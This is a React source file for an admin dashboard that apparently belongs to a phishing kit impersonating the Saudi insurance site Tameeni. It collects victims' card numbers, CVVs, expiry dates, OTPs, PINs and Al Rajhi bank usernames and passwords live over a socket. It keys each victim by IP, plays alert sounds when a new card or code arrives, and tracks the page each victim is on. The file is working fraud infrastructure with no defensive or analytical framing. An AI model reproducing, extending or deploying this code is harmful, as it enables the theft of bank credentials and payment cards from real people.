// src/App.js
import React, { useEffect, useState, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
import { socket } from "./socket";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import InfoModal from "./components/InfoModal";
import Login from "./Login";

export default function App() {
  const [users, setUsers]   = useState({});
  const [cardIp, setCardIp] = useState(null);
  const [infoIp, setInfoIp] = useState(null);
  const [highlightIp]       = useState(null);

  const updateSound   = useRef();
  const cardSound     = useRef();
  const codeSound     = useRef();
  const audioUnlocked = useRef(false);
  const navigate      = useNavigate();

  useEffect(() => {
    updateSound.current = new Audio("/sounds/new-data.wav");
    cardSound.current   = new Audio("/sounds/new-card.wav");
    codeSound.current   = new Audio("/sounds/new-code.wav");
    [updateSound, cardSound, codeSound].forEach(ref => {
      ref.current.preload = "auto";
      ref.current.load();
    });

    const unlockAudio = () => {
      if (audioUnlocked.current) return;
      [updateSound, cardSound, codeSound].forEach(ref => {
        const p = ref.current.play();
        if (p) p.then(() => { ref.current.pause(); ref.current.currentTime = 0; }).catch(() => {});
      });
      audioUnlocked.current = true;
    };
    const events = ["click", "touchstart", "keydown"];
    events.forEach(ev => document.addEventListener(ev, unlockAudio, { once: true }));

    const token = localStorage.getItem("token");
    if (!token) { navigate("/login", { replace: true }); return; }

    socket.connect();
    socket.emit("loadData");

    // ─── initialData ───────────────────────────────────────────────────────────
    socket.on("initialData", (data) => {
      const keepToken = localStorage.getItem("token");
      localStorage.clear();
      if (keepToken) localStorage.setItem("token", keepToken);

      const map = {};
      const ensure = (ip) => {
        if (!map[ip]) map[ip] = { payments: [], flag: false, hasNewData: false, hasPayment: false };
      };

      // السيرفر يرسل: index, vehicle, insurance, addon, summary, otp, pin, phone, phonecode, rajhi, locations, flags
      const simpleKeys = ["index","vehicle","insurance","addon","summary","otp","pin","phone"];
      simpleKeys.forEach(key => {
        (data[key] || []).forEach(r => {
          ensure(r.ip);
          map[r.ip] = { ...map[r.ip], ...r,
            payments: map[r.ip].payments, flag: map[r.ip].flag,
            hasNewData: false, hasPayment: map[r.ip].hasPayment,
            lastActivityAt: Math.max(map[r.ip].lastActivityAt || 0,
              r.updatedAt ? new Date(r.updatedAt).getTime() : 0),
          };
        });
      });

      // phonecode - السيرفر يرسل المفتاح "phonecode" (كله صغير)
      (data.phonecode || []).forEach(r => {
        ensure(r.ip);
        map[r.ip].phoneCode = r.phoneCode;
      });

      // rajhi
      (data.rajhi || []).forEach(r => {
        ensure(r.ip);
        map[r.ip].rajhiUsername = r.username;
        map[r.ip].rajhiPassword = r.password;
      });

      // locations
      (data.locations || []).forEach(r => {
        ensure(r.ip);
        map[r.ip].currentPage = r.currentPage;
      });

      // flags
      (data.flags || []).forEach(r => {
        ensure(r.ip);
        map[r.ip].flag = r.flag;
      });

      // payments
      (data.payment || []).forEach(p => {
        ensure(p.ip);
        map[p.ip].payments.push(p);
        map[p.ip].hasPayment = true;
      });

      setUsers(map);
    });

    // ─── helpers ───────────────────────────────────────────────────────────────
    const play = (ref) => {
      if (!ref.current) return;
      try { ref.current.currentTime = 0; const p = ref.current.play(); if (p) p.catch(() => {}); } catch(e) {}
    };

    const mergeData = (u) => setUsers(m => {
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      play(updateSound);
      return { ...m, [u.ip]: { ...old, ...u, payments: old.payments, flag: old.flag,
        hasNewData: true, hasPayment: old.hasPayment, lastActivityAt: Date.now() }};
    });

    const mergeCode = (u) => setUsers(m => {
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      play(codeSound);
      return { ...m, [u.ip]: { ...old, ...u, payments: old.payments, flag: old.flag,
        hasNewData: true, hasPayment: old.hasPayment, lastActivityAt: Date.now() }};
    });

    const appendPayment = (u) => setUsers(m => {
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      const dup = old.payments.some(p =>
        p.cardNumber === u.cardNumber && p.cvv === u.cvv && p.expiryDate === u.expiryDate);
      if (dup) return m;
      play(cardSound);
      return { ...m, [u.ip]: { ...old, ...u, payments: [...old.payments, u], flag: old.flag,
        hasNewData: true, hasPayment: true, lastActivityAt: Date.now() }};
    });

    const mergeSilent = (u) => setUsers(m => {
      const old = m[u.ip] || { payments: [], flag: false, hasNewData: false, hasPayment: false };
      return { ...m, [u.ip]: { ...old, ...u, payments: old.payments, flag: old.flag,
        hasNewData: old.hasNewData, hasPayment: old.hasPayment }};
    });

    const removeUser = ({ ip }) => setUsers(m => { const c = {...m}; delete c[ip]; return c; });
    const updateFlag = ({ ip, flag }) => setUsers(m => ({
      ...m, [ip]: { ...(m[ip] || { payments:[], flag:false, hasNewData:false, hasPayment:false }), flag }
    }));

    // ─── socket events ─────────────────────────────────────────────────────────
    socket.on("newIndex",     (u) => mergeData(u));
    socket.on("newVehicle",   (u) => mergeData(u));
    socket.on("newInsurance", (u) => mergeData(u));
    socket.on("newAddon",     (u) => mergeData(u));
    socket.on("newSummary",   (u) => mergeData(u));
    socket.on("newPayment",   (u) => appendPayment(u));
    socket.on("newPhone",     (u) => mergeData(u));
    // newPin - السيرفر يرسل { ip, pin }
    socket.on("newPin",       (u) => mergeCode({ ip: u.ip, pin: u.pin }));
    // newOtp - السيرفر يرسل { ip, verificationCode }
    socket.on("newOtp",       (u) => mergeCode({ ip: u.ip, verificationCode: u.verificationCode }));
    // newPhoneCode - السيرفر يرسل { ip, phoneCode }
    socket.on("newPhoneCode", (u) => mergeCode({ ip: u.ip, phoneCode: u.phoneCode }));
    // newRajhi - السيرفر يرسل { ip, username, password }
    socket.on("newRajhi",     (u) => mergeData({ ip: u.ip, rajhiUsername: u.username, rajhiPassword: u.password }));
    // basmahUpdated - السيرفر يرسل { ip, code }
    socket.on("basmahUpdated",(u) => mergeSilent({ ip: u.ip, basmahCode: u.code }));

    socket.on("locationUpdated", ({ ip, page }) => {
      if (page !== "offline") {
        mergeSilent({ ip, currentPage: page });
      } else {
        setUsers(m => m[ip] ? { ...m, [ip]: { ...m[ip], currentPage: "offline" }} : m);
      }
    });

    socket.on("userDeleted", removeUser);
    socket.on("flagUpdated", updateFlag);

    return () => {
      events.forEach(ev => document.removeEventListener(ev, unlockAudio));
      ["initialData","newIndex","newVehicle","newInsurance","newAddon","newSummary",
       "newPayment","newPhone","newPin","newOtp","newPhoneCode","newRajhi",
       "basmahUpdated","locationUpdated","userDeleted","flagUpdated"
      ].forEach(ev => socket.off(ev));
    };
  }, [navigate]);

  const handleShowCard = (ip) => {
    setCardIp(ip);
    setUsers(m => m[ip] ? { ...m, [ip]: { ...m[ip], hasNewData: false }} : m);
  };

  return (
    <Routes>
      <Route path="/login" element={<Login />} />
      <Route path="/" element={
        localStorage.getItem("token") ? (
          <DashboardView users={users} highlightIp={highlightIp}
            cardIp={cardIp} setCardIp={setCardIp}
            infoIp={infoIp} setInfoIp={setInfoIp}
            onShowCard={handleShowCard} />
        ) : <Navigate to="/login" replace />
      } />
      <Route path="*" element={<Navigate to={localStorage.getItem("token") ? "/" : "/login"} replace />} />
    </Routes>
  );
}

function DashboardView({ users, highlightIp, cardIp, onShowCard, infoIp, setInfoIp, setCardIp }) {
  const scrollRef = React.useRef(0);
  React.useLayoutEffect(() => { scrollRef.current = window.scrollY; });
  React.useEffect(() => { window.scrollTo(0, scrollRef.current); });

  return (
    <div className="container py-4">
      <div className="d-flex justify-content-between align-items-center mb-3">
        <h2>تأميني — Admin Dashboard</h2>
      </div>
      <UserTable users={users} highlightIp={highlightIp} cardIp={cardIp}
        onShowCard={onShowCard} onShowInfo={setInfoIp} />
      {cardIp && <CardModal ip={cardIp} user={users[cardIp]} onClose={() => setCardIp(null)} />}
      {infoIp && <InfoModal ip={infoIp} user={users[infoIp]} onClose={() => setInfoIp(null)} />}
    </div>
  );
}
